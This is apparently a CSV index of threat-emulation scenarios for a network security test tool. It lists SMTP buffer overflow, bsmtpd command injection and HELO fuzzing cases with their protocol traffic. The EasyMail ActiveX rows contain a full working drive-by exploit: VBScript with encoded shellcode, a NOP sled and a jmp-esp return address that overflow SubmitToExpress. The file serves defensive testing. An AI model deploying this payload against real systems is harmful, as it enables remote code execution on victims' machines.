XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
bl4_smtp_dos_IPv6.xml,BL4 SMTP Server < 0.1.5 Remote Buffer Overflow PoC (IPv6 Version),This threat sends a crafted SMTP message with an excessively long MAIL FROM command; This causes the BL4 process to crash. BL4 is an SMTP server which typically listens on port 25. (IPv6 Version),SMTP/IPv6,TCP,220 f[[6f ]]ster ES[[4d ]]TP[[0d 0a]]
bl4_smtp_dos_IPv6.xml,BL4 SMTP Server < 0.1.5 Remote Buffer Overflow PoC (IPv6 Version),This threat sends a crafted SMTP message with an excessively long MAIL FROM command; This causes the BL4 process to crash. BL4 is an SMTP server which typically listens on port 25. (IPv6 Version),SMTP/IPv6,TCP,250[[2d ]]SI[[5a ]]E 52428800[[0d 0a ]]250[[2d ]]PIPE[[4c ]]I[[4e ]]I[[4e ]]G[[0d 0a ]]250[[2d ]]AUTH P[[4c ]]AI[[4e ]] [[4c 4f ]]GI[[4e 0d 0a]]
bl4_smtp_dos_IPv6.xml,BL4 SMTP Server < 0.1.5 Remote Buffer Overflow PoC (IPv6 Version),This threat sends a crafted SMTP message with an excessively long MAIL FROM command; This causes the BL4 process to crash. BL4 is an SMTP server which typically listens on port 25. (IPv6 Version),SMTP/IPv6,TCP,250 [[4f 4b 0d 0a]]
bl4_smtp_dos_IPv6.xml,BL4 SMTP Server < 0.1.5 Remote Buffer Overflow PoC (IPv6 Version),This threat sends a crafted SMTP message with an excessively long MAIL FROM command; This causes the BL4 process to crash. BL4 is an SMTP server which typically listens on port 25. (IPv6 Version),SMTP/IPv6,TCP,250 Accepted[[0d 0a]]
bl4_smtp_dos_IPv6.xml,BL4 SMTP Server < 0.1.5 Remote Buffer Overflow PoC (IPv6 Version),This threat sends a crafted SMTP message with an excessively long MAIL FROM command; This causes the BL4 process to crash. BL4 is an SMTP server which typically listens on port 25. (IPv6 Version),SMTP/IPv6,TCP,"354 E[[6e ]]ter [[6d ]]essage[[2c ]] e[[6e ]]di[[6e ]]g with ""[[2e ]]"" [[6f 6e ]] a [[6c ]]i[[6e ]]e by itse[[6c ]]f[[0d 0a]]"
bl4_smtp_dos_IPv6.xml,BL4 SMTP Server < 0.1.5 Remote Buffer Overflow PoC (IPv6 Version),This threat sends a crafted SMTP message with an excessively long MAIL FROM command; This causes the BL4 process to crash. BL4 is an SMTP server which typically listens on port 25. (IPv6 Version),SMTP/IPv6,TCP,250 [[4f 4b ]] id[[3d ]]1HcVW[[6f 2d ]]0007YR[[2d ]]S8
bl4_smtp_dos_IPv6.xml,BL4 SMTP Server < 0.1.5 Remote Buffer Overflow PoC (IPv6 Version),This threat sends a crafted SMTP message with an excessively long MAIL FROM command; This causes the BL4 process to crash. BL4 is an SMTP server which typically listens on port 25. (IPv6 Version),SMTP/IPv6,TCP,221 f[[6f ]]ster c[[6c 6f ]]si[[6e ]]g c[[6f 6e 6e ]]ecti[[6f 6e 0d 0a]]
﻿bsmtp_inject.xml,BSMTPD Command Injection,"This threat takes advantage of a command injection flaw in Debian's bsmtpd batch mailer program.  This allows a user to specify shell characters to run an arbitrary program in the context of the daemon.  This threat takes advantage of an SMTP mailer, which typically listens on port 25.",SMTP,SMTP,BLABB[[0D 0A ]].[[0D 0A]]
bsmtp_inject.xml,BSMTPD Command Injection,"This threat takes advantage of a command injection flaw in Debian's bsmtpd batch mailer program.  This allows a user to specify shell characters to run an arbitrary program in the context of the daemon.  This threat takes advantage of an SMTP mailer, which typically listens on port 25.",SMTP,TCP,220 f[[6f ]]ster ES[[4d ]]TP[[0d 0a]]
bsmtp_inject.xml,BSMTPD Command Injection,"This threat takes advantage of a command injection flaw in Debian's bsmtpd batch mailer program.  This allows a user to specify shell characters to run an arbitrary program in the context of the daemon.  This threat takes advantage of an SMTP mailer, which typically listens on port 25.",SMTP,TCP,250[[2d ]]SI[[5a ]]E 52428800[[0d 0a ]]250[[2d ]]PIPE[[4c ]]I[[4e ]]I[[4e ]]G[[0d 0a ]]250[[2d ]]AUTH P[[4c ]]AI[[4e ]] [[4c 4f ]]GI[[4e 0d 0a]]
bsmtp_inject.xml,BSMTPD Command Injection,"This threat takes advantage of a command injection flaw in Debian's bsmtpd batch mailer program.  This allows a user to specify shell characters to run an arbitrary program in the context of the daemon.  This threat takes advantage of an SMTP mailer, which typically listens on port 25.",SMTP,TCP,250 [[4f 4b 0d 0a]]
bsmtp_inject.xml,BSMTPD Command Injection,"This threat takes advantage of a command injection flaw in Debian's bsmtpd batch mailer program.  This allows a user to specify shell characters to run an arbitrary program in the context of the daemon.  This threat takes advantage of an SMTP mailer, which typically listens on port 25.",SMTP,TCP,250 Accepted[[0d 0a]]
bsmtp_inject.xml,BSMTPD Command Injection,"This threat takes advantage of a command injection flaw in Debian's bsmtpd batch mailer program.  This allows a user to specify shell characters to run an arbitrary program in the context of the daemon.  This threat takes advantage of an SMTP mailer, which typically listens on port 25.",SMTP,TCP,"354 E[[6e ]]ter [[6d ]]essage[[2c ]] e[[6e ]]di[[6e ]]g with ""[[2e ]]"" [[6f 6e ]] a [[6c ]]i[[6e ]]e by itse[[6c ]]f[[0d 0a]]"
bsmtp_inject.xml,BSMTPD Command Injection,"This threat takes advantage of a command injection flaw in Debian's bsmtpd batch mailer program.  This allows a user to specify shell characters to run an arbitrary program in the context of the daemon.  This threat takes advantage of an SMTP mailer, which typically listens on port 25.",SMTP,TCP,250 [[4f 4b ]] id[[3d ]]1HcVW[[6f 2d ]]0007YR[[2d ]]S8
bsmtp_inject.xml,BSMTPD Command Injection,"This threat takes advantage of a command injection flaw in Debian's bsmtpd batch mailer program.  This allows a user to specify shell characters to run an arbitrary program in the context of the daemon.  This threat takes advantage of an SMTP mailer, which typically listens on port 25.",SMTP,TCP,221 f[[6f ]]ster c[[6c 6f ]]si[[6e ]]g c[[6f 6e 6e ]]ecti[[6f 6e 0d 0a]]
﻿bsmtp_inject_IPv6.xml,BSMTPD Command Injection (IPv6 Version),"This threat takes advantage of a command injection flaw in Debian's bsmtpd batch mailer program.  This allows a user to specify shell characters to run an arbitrary program in the context of the daemon.  This threat takes advantage of an SMTP mailer, which typically listens on port 25. (IPv6 Version)",SMTP/IPv6,SMTP,BLABB[[0D 0A ]].[[0D 0A]]
bsmtp_inject_IPv6.xml,BSMTPD Command Injection (IPv6 Version),"This threat takes advantage of a command injection flaw in Debian's bsmtpd batch mailer program.  This allows a user to specify shell characters to run an arbitrary program in the context of the daemon.  This threat takes advantage of an SMTP mailer, which typically listens on port 25. (IPv6 Version)",SMTP/IPv6,TCP,220 f[[6f ]]ster ES[[4d ]]TP[[0d 0a]]
bsmtp_inject_IPv6.xml,BSMTPD Command Injection (IPv6 Version),"This threat takes advantage of a command injection flaw in Debian's bsmtpd batch mailer program.  This allows a user to specify shell characters to run an arbitrary program in the context of the daemon.  This threat takes advantage of an SMTP mailer, which typically listens on port 25. (IPv6 Version)",SMTP/IPv6,TCP,250[[2d ]]SI[[5a ]]E 52428800[[0d 0a ]]250[[2d ]]PIPE[[4c ]]I[[4e ]]I[[4e ]]G[[0d 0a ]]250[[2d ]]AUTH P[[4c ]]AI[[4e ]] [[4c 4f ]]GI[[4e 0d 0a]]
bsmtp_inject_IPv6.xml,BSMTPD Command Injection (IPv6 Version),"This threat takes advantage of a command injection flaw in Debian's bsmtpd batch mailer program.  This allows a user to specify shell characters to run an arbitrary program in the context of the daemon.  This threat takes advantage of an SMTP mailer, which typically listens on port 25. (IPv6 Version)",SMTP/IPv6,TCP,250 [[4f 4b 0d 0a]]
bsmtp_inject_IPv6.xml,BSMTPD Command Injection (IPv6 Version),"This threat takes advantage of a command injection flaw in Debian's bsmtpd batch mailer program.  This allows a user to specify shell characters to run an arbitrary program in the context of the daemon.  This threat takes advantage of an SMTP mailer, which typically listens on port 25. (IPv6 Version)",SMTP/IPv6,TCP,250 Accepted[[0d 0a]]
bsmtp_inject_IPv6.xml,BSMTPD Command Injection (IPv6 Version),"This threat takes advantage of a command injection flaw in Debian's bsmtpd batch mailer program.  This allows a user to specify shell characters to run an arbitrary program in the context of the daemon.  This threat takes advantage of an SMTP mailer, which typically listens on port 25. (IPv6 Version)",SMTP/IPv6,TCP,"354 E[[6e ]]ter [[6d ]]essage[[2c ]] e[[6e ]]di[[6e ]]g with ""[[2e ]]"" [[6f 6e ]] a [[6c ]]i[[6e ]]e by itse[[6c ]]f[[0d 0a]]"
bsmtp_inject_IPv6.xml,BSMTPD Command Injection (IPv6 Version),"This threat takes advantage of a command injection flaw in Debian's bsmtpd batch mailer program.  This allows a user to specify shell characters to run an arbitrary program in the context of the daemon.  This threat takes advantage of an SMTP mailer, which typically listens on port 25. (IPv6 Version)",SMTP/IPv6,TCP,250 [[4f 4b ]] id[[3d ]]1HcVW[[6f 2d ]]0007YR[[2d ]]S8
bsmtp_inject_IPv6.xml,BSMTPD Command Injection (IPv6 Version),"This threat takes advantage of a command injection flaw in Debian's bsmtpd batch mailer program.  This allows a user to specify shell characters to run an arbitrary program in the context of the daemon.  This threat takes advantage of an SMTP mailer, which typically listens on port 25. (IPv6 Version)",SMTP/IPv6,TCP,221 f[[6f ]]ster c[[6c 6f ]]si[[6e ]]g c[[6f 6e 6e ]]ecti[[6f 6e 0d 0a]]
﻿easymail_emsmtp_activex_bof.xml,EasyMail Objects EMSMTP.DLL ActiveX Control Remote Buffer Overflow Vulnerability,"This threat downloads a malicious web page which triggers a buffer overflow in the
EasyMail Objects (EMSMTP.DLL) ActiveX application, resulting in the overwritingof arbitrary files
or code execution. This threat is delived via HTTP port 80.",HTTP,TCP,GET /index.html HTTP/1.0[[0D 0A ]]Host: www.site.net[[0D 0A ]]User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
easymail_emsmtp_activex_bof.xml,EasyMail Objects EMSMTP.DLL ActiveX Control Remote Buffer Overflow Vulnerability,"This threat downloads a malicious web page which triggers a buffer overflow in the
EasyMail Objects (EMSMTP.DLL) ActiveX application, resulting in the overwritingof arbitrary files
or code execution. This threat is delived via HTTP port 80.",HTTP,TCP,"HTTP/1.0 200 OK[[0D 0A ]]Wed, 18 Aug 2007 10:08:40 GMT[[0D 0A ]]Server: Apache[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Connection: Keep-Alive[[0D 0A ]]Content Type: text/html[[0D 0A 0D 0A ]]<html>[[0D 0A ]]<object classid='clsid:68AC0D5F-0424-11D5-822F-00C04F6BA8D9' id='EasyMailSMTPObj' /></object>[[0D 0A ]]<script language='vbscript'>[[0D 0A 0D 0A ]]     'open calc.exe[[0D 0A ]]     scode = unescape(""%eb%03%59%eb%05%e8%f8%ff%ff%ff%4f%49%49%49%49%49"") & _[[0D 0A ]]             unescape(""%49%51%5a%56%54%58%36%33%30%56%58%34%41%30%42%36"") & _[[0D 0A ]]             unescape(""%48%48%30%42%33%30%42%43%56%58%32%42%44%42%48%34"") & _[[0D 0A ]]             unescape(""%41%32%41%44%30%41%44%54%42%44%51%42%30%41%44%41"") & _[[0D 0A ]]             unescape(""%56%58%34%5a%38%42%44%4a%4f%4d%4e%4f%4a%4e%46%54"") & _[[0D 0A ]]             unescape(""%42%30%42%50%42%50%4b%58%45%54%4e%53%4b%58%4e%37"") & _[[0D 0A ]]             unescape(""%45%50%4a%47%41%30%4f%4e%4b%38%4f%44%4a%51%4b%48"") & _[[0D 0A ]]             unescape(""%4f%55%42%42%41%30%4b%4e%49%44%4b%48%46%43%4b%38"") & _[[0D 0A ]]             unescape(""%41%30%50%4e%41%53%42%4c%49%49%4e%4a%46%58%42%4c"") & _[[0D 0A ]]             unescape(""%46%57%47%50%41%4c%4c%4c%4d%50%41%30%44%4c%4b%4e"") & _[[0D 0A ]]             unescape(""%46%4f%4b%53%46%35%46%32%46%30%45%37%45%4e%4b%48"") & _[[0D 0A ]]             unescape(""%4f%35%46%32%41%50%4b%4e%48%56%4b%38%4e%50%4b%54"") & _[[0D 0A ]]             unescape(""%4b%48%4f%55%4e%31%41%30%4b%4e%4b%38%4e%41%4b%38"") & _[[0D 0A ]]             unescape(""%41%30%4b%4e%49%58%4e%35%46%42%46%50%43%4c%41%43"") & _[[0D 0A ]]             unescape(""%42%4c%46%36%4b%48%42%34%42%33%45%38%42%4c%4a%37"") & _[[0D 0A ]]             unescape(""%4e%30%4b%48%42%34%4e%50%4b%48%42%57%4e%31%4d%4a"") & _[[0D 0A ]]             unescape(""%4b%38%4a%46%4a%50%4b%4e%49%50%4b%48%42%38%42%4b"") & _[[0D 0A ]]             unescape(""%42%30%42%50%42%30%4b%48%4a%36%4e%53%4f%35%41%33"") & _[[0D 0A ]]             unescape(""%48%4f%42%46%48%35%49%58%4a%4f%43%48%42%4c%4b%57"") & _[[0D 0A ]]             unescape(""%42%55%4a%46%42%4f%4c%48%46%50%4f%35%4a%46%4a%49"") & _[[0D 0A ]]             unescape(""%50%4f%4c%38%50%30%47%55%4f%4f%47%4e%43%56%41%36"") & _[[0D 0A ]]             unescape(""%4e%46%43%46%50%52%45%36%4a%37%45%36%42%30%5a"")[[0D 0A 0D 0A 0D 0A ]]esi = unescape(""%01%01%01%01"")[[0D 0A ]]ebp = ""bbbb""[[0D 0A ]]nop = string(16,unescape(""%90""))[[0D 0A ]]eip = unescape(""%78%2c%41%7e"") '0x7E412C78 jmp esp user32.dll[[0D 0A ]]bof = string(539,""A"") + esi + ebp + eip + nop + scode[[0D 0A 0D 0A ]]EasyMailSMTPObj.SubmitToExpress bof[[0D 0A 0D 0A ]]</script>[[0D 0A ]]</html>"
﻿easymail_emsmtp_activex_bof_IPv6.xml,EasyMail Objects EMSMTP.DLL ActiveX Control Remote Buffer Overflow Vulnerability (IPv6 Version),"This threat downloads a malicious web page which triggers a buffer overflow in the
EasyMail Objects (EMSMTP.DLL) ActiveX application, resulting in the overwritingof arbitrary files
or code execution. This threat is delived via HTTP port 80. (IPv6 Version)",HTTP/IPv6,TCP,GET /index.html HTTP/1.0[[0D 0A ]]Host: www.site.net[[0D 0A ]]User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
easymail_emsmtp_activex_bof_IPv6.xml,EasyMail Objects EMSMTP.DLL ActiveX Control Remote Buffer Overflow Vulnerability (IPv6 Version),"This threat downloads a malicious web page which triggers a buffer overflow in the
EasyMail Objects (EMSMTP.DLL) ActiveX application, resulting in the overwritingof arbitrary files
or code execution. This threat is delived via HTTP port 80. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP/1.0 200 OK[[0D 0A ]]Wed, 18 Aug 2007 10:08:40 GMT[[0D 0A ]]Server: Apache[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Connection: Keep-Alive[[0D 0A ]]Content Type: text/html[[0D 0A 0D 0A ]]<html>[[0D 0A ]]<object classid='clsid:68AC0D5F-0424-11D5-822F-00C04F6BA8D9' id='EasyMailSMTPObj' /></object>[[0D 0A ]]<script language='vbscript'>[[0D 0A 0D 0A ]]     'open calc.exe[[0D 0A ]]     scode = unescape(""%eb%03%59%eb%05%e8%f8%ff%ff%ff%4f%49%49%49%49%49"") & _[[0D 0A ]]             unescape(""%49%51%5a%56%54%58%36%33%30%56%58%34%41%30%42%36"") & _[[0D 0A ]]             unescape(""%48%48%30%42%33%30%42%43%56%58%32%42%44%42%48%34"") & _[[0D 0A ]]             unescape(""%41%32%41%44%30%41%44%54%42%44%51%42%30%41%44%41"") & _[[0D 0A ]]             unescape(""%56%58%34%5a%38%42%44%4a%4f%4d%4e%4f%4a%4e%46%54"") & _[[0D 0A ]]             unescape(""%42%30%42%50%42%50%4b%58%45%54%4e%53%4b%58%4e%37"") & _[[0D 0A ]]             unescape(""%45%50%4a%47%41%30%4f%4e%4b%38%4f%44%4a%51%4b%48"") & _[[0D 0A ]]             unescape(""%4f%55%42%42%41%30%4b%4e%49%44%4b%48%46%43%4b%38"") & _[[0D 0A ]]             unescape(""%41%30%50%4e%41%53%42%4c%49%49%4e%4a%46%58%42%4c"") & _[[0D 0A ]]             unescape(""%46%57%47%50%41%4c%4c%4c%4d%50%41%30%44%4c%4b%4e"") & _[[0D 0A ]]             unescape(""%46%4f%4b%53%46%35%46%32%46%30%45%37%45%4e%4b%48"") & _[[0D 0A ]]             unescape(""%4f%35%46%32%41%50%4b%4e%48%56%4b%38%4e%50%4b%54"") & _[[0D 0A ]]             unescape(""%4b%48%4f%55%4e%31%41%30%4b%4e%4b%38%4e%41%4b%38"") & _[[0D 0A ]]             unescape(""%41%30%4b%4e%49%58%4e%35%46%42%46%50%43%4c%41%43"") & _[[0D 0A ]]             unescape(""%42%4c%46%36%4b%48%42%34%42%33%45%38%42%4c%4a%37"") & _[[0D 0A ]]             unescape(""%4e%30%4b%48%42%34%4e%50%4b%48%42%57%4e%31%4d%4a"") & _[[0D 0A ]]             unescape(""%4b%38%4a%46%4a%50%4b%4e%49%50%4b%48%42%38%42%4b"") & _[[0D 0A ]]             unescape(""%42%30%42%50%42%30%4b%48%4a%36%4e%53%4f%35%41%33"") & _[[0D 0A ]]             unescape(""%48%4f%42%46%48%35%49%58%4a%4f%43%48%42%4c%4b%57"") & _[[0D 0A ]]             unescape(""%42%55%4a%46%42%4f%4c%48%46%50%4f%35%4a%46%4a%49"") & _[[0D 0A ]]             unescape(""%50%4f%4c%38%50%30%47%55%4f%4f%47%4e%43%56%41%36"") & _[[0D 0A ]]             unescape(""%4e%46%43%46%50%52%45%36%4a%37%45%36%42%30%5a"")[[0D 0A 0D 0A 0D 0A ]]esi = unescape(""%01%01%01%01"")[[0D 0A ]]ebp = ""bbbb""[[0D 0A ]]nop = string(16,unescape(""%90""))[[0D 0A ]]eip = unescape(""%78%2c%41%7e"") '0x7E412C78 jmp esp user32.dll[[0D 0A ]]bof = string(539,""A"") + esi + ebp + eip + nop + scode[[0D 0A 0D 0A ]]EasyMailSMTPObj.SubmitToExpress bof[[0D 0A 0D 0A ]]</script>[[0D 0A ]]</html>"
﻿fuzz-SMTP-HELO_Parameter_A.xml,Fuzz SMTP HELO verb with large buffer,Fuzzes the SMTP HELO Parameter with A from size of 0 to a size of 4096.,SMTP,TCP,220 f[[6f ]]ster ES[[4d ]]TP[[0d 0a]]
fuzz-SMTP-HELO_Parameter_A.xml,Fuzz SMTP HELO verb with large buffer,Fuzzes the SMTP HELO Parameter with A from size of 0 to a size of 4096.,SMTP,TCP,250[[2d ]]SI[[5a ]]E 52428800[[0d 0a ]]250[[2d ]]PIPE[[4c ]]I[[4e ]]I[[4e ]]G[[0d 0a ]]250[[2d ]]AUTH P[[4c ]]AI[[4e ]] [[4c 4f ]]GI[[4e 0d 0a]]
fuzz-SMTP-HELO_Parameter_A.xml,Fuzz SMTP HELO verb with large buffer,Fuzzes the SMTP HELO Parameter with A from size of 0 to a size of 4096.,SMTP,TCP,250 [[4f 4b 0d 0a]]
fuzz-SMTP-HELO_Parameter_A.xml,Fuzz SMTP HELO verb with large buffer,Fuzzes the SMTP HELO Parameter with A from size of 0 to a size of 4096.,SMTP,TCP,250 Accepted[[0d 0a]]
fuzz-SMTP-HELO_Parameter_A.xml,Fuzz SMTP HELO verb with large buffer,Fuzzes the SMTP HELO Parameter with A from size of 0 to a size of 4096.,SMTP,TCP,"354 E[[6e ]]ter [[6d ]]essage[[2c ]] e[[6e ]]di[[6e ]]g with ""[[2e ]]"" [[6f 6e ]] a [[6c ]]i[[6e ]]e by itse[[6c ]]f[[0d 0a]]"
fuzz-SMTP-HELO_Parameter_A.xml,Fuzz SMTP HELO verb with large buffer,Fuzzes the SMTP HELO Parameter with A from size of 0 to a size of 4096.,SMTP,TCP,250 [[4f 4b ]] id[[3d ]]1HcVW[[6f 2d ]]0007YR[[2d ]]S8
fuzz-SMTP-HELO_Parameter_A.xml,Fuzz SMTP HELO verb with large buffer,Fuzzes the SMTP HELO Parameter with A from size of 0 to a size of 4096.,SMTP,TCP,221 f[[6f ]]ster c[[6c 6f ]]si[[6e ]]g c[[6f 6e 6e ]]ecti[[6f 6e 0d 0a]]
﻿fuzz-SMTP-HELO_Parameter_A_IPv6.xml,Fuzz SMTP HELO verb with large buffer (IPv6 Version),Fuzzes the SMTP HELO Parameter with A from size of 0 to a size of 4096. (IPv6 Version),SMTP/IPv6,TCP,220 f[[6f ]]ster ES[[4d ]]TP[[0d 0a]]
fuzz-SMTP-HELO_Parameter_A_IPv6.xml,Fuzz SMTP HELO verb with large buffer (IPv6 Version),Fuzzes the SMTP HELO Parameter with A from size of 0 to a size of 4096. (IPv6 Version),SMTP/IPv6,TCP,250[[2d ]]SI[[5a ]]E 52428800[[0d 0a ]]250[[2d ]]PIPE[[4c ]]I[[4e ]]I[[4e ]]G[[0d 0a ]]250[[2d ]]AUTH P[[4c ]]AI[[4e ]] [[4c 4f ]]GI[[4e 0d 0a]]
fuzz-SMTP-HELO_Parameter_A_IPv6.xml,Fuzz SMTP HELO verb with large buffer (IPv6 Version),Fuzzes the SMTP HELO Parameter with A from size of 0 to a size of 4096. (IPv6 Version),SMTP/IPv6,TCP,250 [[4f 4b 0d 0a]]
fuzz-SMTP-HELO_Parameter_A_IPv6.xml,Fuzz SMTP HELO verb with large buffer (IPv6 Version),Fuzzes the SMTP HELO Parameter with A from size of 0 to a size of 4096. (IPv6 Version),SMTP/IPv6,TCP,250 Accepted[[0d 0a]]
fuzz-SMTP-HELO_Parameter_A_IPv6.xml,Fuzz SMTP HELO verb with large buffer (IPv6 Version),Fuzzes the SMTP HELO Parameter with A from size of 0 to a size of 4096. (IPv6 Version),SMTP/IPv6,TCP,"354 E[[6e ]]ter [[6d ]]essage[[2c ]] e[[6e ]]di[[6e ]]g with ""[[2e ]]"" [[6f 6e ]] a [[6c ]]i[[6e ]]e by itse[[6c ]]f[[0d 0a]]"
fuzz-SMTP-HELO_Parameter_A_IPv6.xml,Fuzz SMTP HELO verb with large buffer (IPv6 Version),Fuzzes the SMTP HELO Parameter with A from size of 0 to a size of 4096. (IPv6 Version),SMTP/IPv6,TCP,250 [[4f 4b ]] id[[3d ]]1HcVW[[6f 2d ]]0007YR[[2d ]]S8
fuzz-SMTP-HELO_Parameter_A_IPv6.xml,Fuzz SMTP HELO verb with large buffer (IPv6 Version),Fuzzes the SMTP HELO Parameter with A from size of 0 to a size of 4096. (IPv6 Version),SMTP/IPv6,TCP,221 f[[6f ]]ster c[[6c 6f ]]si[[6e ]]g c[[6f 6e 6e ]]ecti[[6f 6e 0d 0a]]
﻿fuzz-SMTP-HELO_Parameter_ampersand.xml,Fuzz SMTP HELO verb with &,Fuzzes the SMTP HELO Parameter with &  from size of 0 to a size of 4096.,SMTP,TCP,220 f[[6f ]]ster ES[[4d ]]TP[[0d 0a]]
fuzz-SMTP-HELO_Parameter_ampersand.xml,Fuzz SMTP HELO verb with &,Fuzzes the SMTP HELO Parameter with &  from size of 0 to a size of 4096.,SMTP,TCP,250[[2d ]]SI[[5a ]]E 52428800[[0d 0a ]]250[[2d ]]PIPE[[4c ]]I[[4e ]]I[[4e ]]G[[0d 0a ]]250[[2d ]]AUTH P[[4c ]]AI[[4e ]] [[4c 4f ]]GI[[4e 0d 0a]]
fuzz-SMTP-HELO_Parameter_ampersand.xml,Fuzz SMTP HELO verb with &,Fuzzes the SMTP HELO Parameter with &  from size of 0 to a size of 4096.,SMTP,TCP,250 [[4f 4b 0d 0a]]
fuzz-SMTP-HELO_Parameter_ampersand.xml,Fuzz SMTP HELO verb with &,Fuzzes the SMTP HELO Parameter with &  from size of 0 to a size of 4096.,SMTP,TCP,250 Accepted[[0d 0a]]
fuzz-SMTP-HELO_Parameter_ampersand.xml,Fuzz SMTP HELO verb with &,Fuzzes the SMTP HELO Parameter with &  from size of 0 to a size of 4096.,SMTP,TCP,"354 E[[6e ]]ter [[6d ]]essage[[2c ]] e[[6e ]]di[[6e ]]g with ""[[2e ]]"" [[6f 6e ]] a [[6c ]]i[[6e ]]e by itse[[6c ]]f[[0d 0a]]"
fuzz-SMTP-HELO_Parameter_ampersand.xml,Fuzz SMTP HELO verb with &,Fuzzes the SMTP HELO Parameter with &  from size of 0 to a size of 4096.,SMTP,TCP,250 [[4f 4b ]] id[[3d ]]1HcVW[[6f 2d ]]0007YR[[2d ]]S8
fuzz-SMTP-HELO_Parameter_ampersand.xml,Fuzz SMTP HELO verb with &,Fuzzes the SMTP HELO Parameter with &  from size of 0 to a size of 4096.,SMTP,TCP,221 f[[6f ]]ster c[[6c 6f ]]si[[6e ]]g c[[6f 6e 6e ]]ecti[[6f 6e 0d 0a]]
﻿fuzz-SMTP-HELO_Parameter_ampersand_IPv6.xml,Fuzz SMTP HELO verb with ,Fuzzes the SMTP HELO Parameter with ,SMTP/IPv6,TCP,220 f[[6f ]]ster ES[[4d ]]TP[[0d 0a]]
fuzz-SMTP-HELO_Parameter_ampersand_IPv6.xml,Fuzz SMTP HELO verb with ,Fuzzes the SMTP HELO Parameter with ,SMTP/IPv6,TCP,250[[2d ]]SI[[5a ]]E 52428800[[0d 0a ]]250[[2d ]]PIPE[[4c ]]I[[4e ]]I[[4e ]]G[[0d 0a ]]250[[2d ]]AUTH P[[4c ]]AI[[4e ]] [[4c 4f ]]GI[[4e 0d 0a]]
fuzz-SMTP-HELO_Parameter_ampersand_IPv6.xml,Fuzz SMTP HELO verb with ,Fuzzes the SMTP HELO Parameter with ,SMTP/IPv6,TCP,250 [[4f 4b 0d 0a]]
fuzz-SMTP-HELO_Parameter_ampersand_IPv6.xml,Fuzz SMTP HELO verb with ,Fuzzes the SMTP HELO Parameter with ,SMTP/IPv6,TCP,250 Accepted[[0d 0a]]
fuzz-SMTP-HELO_Parameter_ampersand_IPv6.xml,Fuzz SMTP HELO verb with ,Fuzzes the SMTP HELO Parameter with ,SMTP/IPv6,TCP,"354 E[[6e ]]ter [[6d ]]essage[[2c ]] e[[6e ]]di[[6e ]]g with ""[[2e ]]"" [[6f 6e ]] a [[6c ]]i[[6e ]]e by itse[[6c ]]f[[0d 0a]]"
fuzz-SMTP-HELO_Parameter_ampersand_IPv6.xml,Fuzz SMTP HELO verb with ,Fuzzes the SMTP HELO Parameter with ,SMTP/IPv6,TCP,250 [[4f 4b ]] id[[3d ]]1HcVW[[6f 2d ]]0007YR[[2d ]]S8
fuzz-SMTP-HELO_Parameter_ampersand_IPv6.xml,Fuzz SMTP HELO verb with ,Fuzzes the SMTP HELO Parameter with ,SMTP/IPv6,TCP,221 f[[6f ]]ster c[[6c 6f ]]si[[6e ]]g c[[6f 6e 6e ]]ecti[[6f 6e 0d 0a]]
﻿fuzz-SMTP-HELO_Parameter_backSlash.xml,Fuzz SMTP HELO verb with \,Fuzzes the SMTP HELO Parameter with \  from size of 0 to a size of 4096.,SMTP,TCP,220 f[[6f ]]ster ES[[4d ]]TP[[0d 0a]]
fuzz-SMTP-HELO_Parameter_backSlash.xml,Fuzz SMTP HELO verb with \,Fuzzes the SMTP HELO Parameter with \  from size of 0 to a size of 4096.,SMTP,TCP,250[[2d ]]SI[[5a ]]E 52428800[[0d 0a ]]250[[2d ]]PIPE[[4c ]]I[[4e ]]I[[4e ]]G[[0d 0a ]]250[[2d ]]AUTH P[[4c ]]AI[[4e ]] [[4c 4f ]]GI[[4e 0d 0a]]
fuzz-SMTP-HELO_Parameter_backSlash.xml,Fuzz SMTP HELO verb with \,Fuzzes the SMTP HELO Parameter with \  from size of 0 to a size of 4096.,SMTP,TCP,250 [[4f 4b 0d 0a]]
fuzz-SMTP-HELO_Parameter_backSlash.xml,Fuzz SMTP HELO verb with \,Fuzzes the SMTP HELO Parameter with \  from size of 0 to a size of 4096.,SMTP,TCP,250 Accepted[[0d 0a]]
